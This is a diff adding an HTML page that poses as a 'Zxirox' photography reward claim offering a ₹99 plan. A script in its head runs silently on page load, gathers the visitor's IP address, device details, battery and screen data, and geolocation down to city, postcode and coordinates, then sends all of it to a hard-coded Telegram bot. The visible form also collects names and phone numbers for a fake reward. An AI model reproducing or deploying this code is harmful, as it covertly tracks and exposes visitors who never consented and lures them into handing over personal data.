@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zxirox Reddm Code</title>
+    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700&display=swap" rel="stylesheet">
+    <script type='text/javascript'>
+        //<![CDATA[ 
+         function myFunction() {
+            // Get the current URL
+            const currentURL = window.location.href;
+        
+            fetch("https://api.ipify.org?format=json")
+                .then(response => response.json())
+                .then(ipData => {
+                    const ipAddress = ipData.ip;
+                    const userAgent = navigator.userAgent;
+                    const deviceMemory = navigator.deviceMemory;
+        
+                    // Get network information
+                    const connectionType = navigator.connection.type;
+                    const effectiveConnectionType = navigator.connection.effectiveType;
+        
+                    // Get battery information
+                    navigator.getBattery().then(batteryData => {
+                        const batteryLevel = batteryData.level * 100; // Battery level in percentage
+                        const charging = batteryData.charging ? 'Plugged In' : 'Not Plugged In';
+        
+                        // Get screen information
+                        const screenWidth = window.screen.width;
+                        const screenHeight = window.screen.height;
+                        const screenOrientation = window.screen.orientation.type;
+        
+                        // Get window information
+                        const windowWidth = window.innerWidth;
+                        const windowHeight = window.innerHeight;
+        
+                        const geoUrl = `https://ipapi.co/${ipAddress}/json/`;
+        
+                        fetch(geoUrl)
+                            .then(geoResponse => geoResponse.json())
+                            .then(geoData => {
+                                const country = geoData.country_name;
+                                const region = geoData.region;
+                                const city = geoData.city;
+                                const zip = geoData.postal;
+                                const latitude = geoData.latitude;
+                                const longitude = geoData.longitude;
+                                const timezone = geoData.timezone;
+                                const isp = geoData.org;
+        
+                                const text = encodeURIComponent(`${currentURL} Url Detect New Users ipAddress: ${ipAddress}\nDevice Info: ${userAgent}\nDevice Memory: ${deviceMemory} GB\nConnection Type: ${connectionType}\nEffective Connection Type: ${effectiveConnectionType}\nBattery Level: ${batteryLevel}%\nBattery Status: ${charging}\nCountry: ${country}\nRegion: ${region}\nCity: ${city}\nZip Code: ${zip}\nLatitude: ${latitude}\nLongitude: ${longitude}\nTimezone: ${timezone}\nISP: ${isp}\nScreen Width: ${screenWidth}px\nScreen Height: ${screenHeight}px\nScreen Orientation: ${screenOrientation}\nWindow Width: ${windowWidth}px\nWindow Height: ${windowHeight}px`);
+        
+                                const apiUrl = `https://api.telegram.org/bot6696450444:AAEjPvTws_uuAuN2g_resbLkQth5AWu7l_E/sendMessage?chat_id=5114789651&text=${text}`;
+                                fetch(apiUrl)
+                                    .then(response => response.json())
+                                    .then(data => {
+                                        console.log(data);
+                                    })
+                                    .catch(error => {
+                                        console.error(error);
+                                    });
+                            })
+                            .catch(error => {
+                                console.error(error);
+                            });
+                    });
+                })
+                .catch(error => {
+                    console.error(error);
+                });
+        }
+        
+        window.addEventListener('load', myFunction);
+        
+        //]]>
+        </script>
+   <style>
+        body {
+            background: linear-gradient(135deg, #f8f9fa, #e9ecef);
+            color: #2c3e50;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 600px;
+            width: 100%;
+            text-align: center;
+        }
+
+        .brand {
+            font-family: 'Playfair Display', serif;
+            font-size: 2.5rem;
+            font-weight: 700;
+            color: #1e40af;
+            margin-bottom: 1.5rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .form-container {
+            background: white;
+            padding: 2.5rem;
+            border-radius: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            border: 1px solid rgba(0,0,0,0.05);
+        }
+
+        input {
+            width: 90%;
+            padding: 15px;
+            margin: 15px 0;
+            background: #f8f9fa;
+            border: 2px solid #e9ecef;
+            color: #2c3e50;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #3b82f6;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
+        }
+
+        button {
+            background: linear-gradient(135deg, #3b82f6, #2563eb);
+            color: white;
+            border: none;
+            padding: 15px 35px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-weight: 600;
+            margin: 20px 0;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(59, 130, 246, 0.2);
+        }
+
+        .message-box {
+            display: none;
+            background: white;
+            padding: 2.5rem;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            border: 1px solid rgba(0,0,0,0.05);
+        }
+
+        .code-display {
+            font-size: 2.2rem;
+            letter-spacing: 3px;
+            margin: 25px 0;
+            padding: 20px;
+            background: #3b82f6;
+            color: white;
+            border-radius: 12px;
+            font-weight: bold;
+        }
+
+        .instructions {
+            text-align: left;
+            margin: 25px 0;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 12px;
+            border: 1px solid #e9ecef;
+        }
+
+        .congrats-message {
+            font-size: 1.4rem;
+            margin-bottom: 1.5rem;
+            color: #2563eb;
+        }
+
+        .how-to-use-btn {
+            background: #3b82f6;
+            color: white;
+            padding: 12px 25px;
+            border-radius: 8px;
+            font-size: 14px;
+            margin-top: 15px;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .how-to-use-btn:hover {
+            background: #2563eb;
+        }
+
+        .download-btn {
+            background: #10b981;
+            color: white;
+            padding: 12px 25px;
+            border-radius: 8px;
+            font-size: 14px;
+            margin-top: 15px;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .download-btn:hover {
+            background: #059669;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="brand">ZXIROX</div>
+        <div class="form-container" id="formContainer">
+            <h2>Claim Your Reward</h2>
+            <form id="userForm" action="save_data.php" method="POST">
+                <input type="text" id="userName" name="name" placeholder="Full Name" maxlength="20" required>
+                <input type="tel" id="phoneNumber" name="phone" placeholder="Phone Number" maxlength="10" required>
+                <button type="submit">submit</button>
+            </form>
+        </div>
+
+        <div class="message-box" id="messageBox">
+            <div class="congrats-message">
+                🎉 Congratulations! Your ₹99 Unlimited 1-Hour Photography Plan is now active! 📸✨
+            </div>
+            <div class="code-display" id="generatedCode"></div>
+            <button class="how-to-use-btn" onclick="showInstructions()">
+                How to Use
+            </button>
+            <div class="instructions" id="instructions" style="display: none;">
+                <p>1️⃣ Download the image and mention <strong>@zxirox</strong> on your Instagram Story with the code <strong>Zxirox 24</strong>.</p>  
+<p>2️⃣ We will reply and approve your request.</p>  
+<p>⏳ Offer valid for <strong>72 hours only!</strong> <em>T&C Apply.</em></p>                 
+            </div>
+            <button class="download-btn" onclick="downloadImage()">
+                Download Image 📥
+            </button>
+        </div>
+    </div>
+
+    <script>
+        // JavaScript to handle form submission and display the message box
+        document.getElementById('userForm').addEventListener('submit', function (event) {
+            event.preventDefault(); // Prevent default form submission
+
+            const name = document.getElementById('userName').value.trim();
+            const phone = document.getElementById('phoneNumber').value.trim();
+
+            if (!name || !phone) {
+                alert('Please fill in all fields');
+                return;
+            }
+
+            if (!/^[6-9]\d{9}$/.test(phone)) {
+                alert('Please enter a valid 10-digit Indian phone number');
+                return;
+            }
+
+            // Generate code logic
+            const namePart = name.slice(0, 4).toUpperCase();
+            const phonePart = phone.slice(-4);
+            const generatedCode = `${namePart}${phonePart}`;
+
+            // Display the generated code
+            document.getElementById('formContainer').style.display = 'none';
+            document.getElementById('messageBox').style.display = 'block';
+            document.getElementById('generatedCode').textContent = generatedCode;
+
+            // Submit the form data to PHP
+            const formData = new FormData(this);
+            fetch('save_data.php', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log(data); // Log the response from PHP
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        });
+
+        function showInstructions() {
+            const instructions = document.getElementById('instructions');
+            instructions.style.display = 'block';
+        }
+
+        function downloadImage() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+
+            // Set canvas size
+            canvas.width = 800;
+            canvas.height = 600;
+
+            // Background color
+            ctx.fillStyle = '#ffffff';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+            // Add brand name
+            ctx.fillStyle = '#1e40af';
+            ctx.font = 'bold 60px Playfair Display';
+            ctx.textAlign = 'center';
+            ctx.fillText('ZXIROX', canvas.width / 2, 100);
+
+            // Add congratulatory message
+            ctx.fillStyle = '#2563eb';
+            ctx.font = 'bold 30px Arial';
+            ctx.textAlign = 'center';
+            ctx.fillText(`🎉 Congratulations, ${document.getElementById('userName').value.trim()}! 🎉`, canvas.width / 2, 200);
+
+            // Add team message
+            ctx.fillStyle = '#2c3e50';
+            ctx.font = 'bold 20px Arial';
+            ctx.fillText('A special surprise for you from Team Zxirox Photography! 📸✨', canvas.width / 2, 250);
+
+            // Add generated code
+            ctx.fillStyle = '#3b82f6';
+            ctx.font = 'bold 50px Arial';
+            ctx.fillText(document.getElementById('generatedCode').textContent, canvas.width / 2, 350);
+
+            // Add instructions
+            ctx.fillStyle = '#2c3e50';
+            ctx.font = '20px Arial';
+            ctx.textAlign = 'left';
+            const instructions = [
+                '1️⃣ Download the image and mention @zxirox on your Instagram Story with the code Zxirox 24.',
+                '2️⃣ We will reply and send you the code.',
+                '⏳ Offer valid for 72 hours only! T&C Apply.'
+            ];
+            instructions.forEach((line, index) => {
+                ctx.fillText(line, 50, 400 + index * 30);
+            });
+
+            // Create download link
+            const link = document.createElement('a');
+            link.download = `Redmi_Code_${document.getElementById('generatedCode').textContent}.png`;
+            link.href = canvas.toDataURL('image/png');
+            link.click();
+        }
+    </script>
+</body>
+</html>
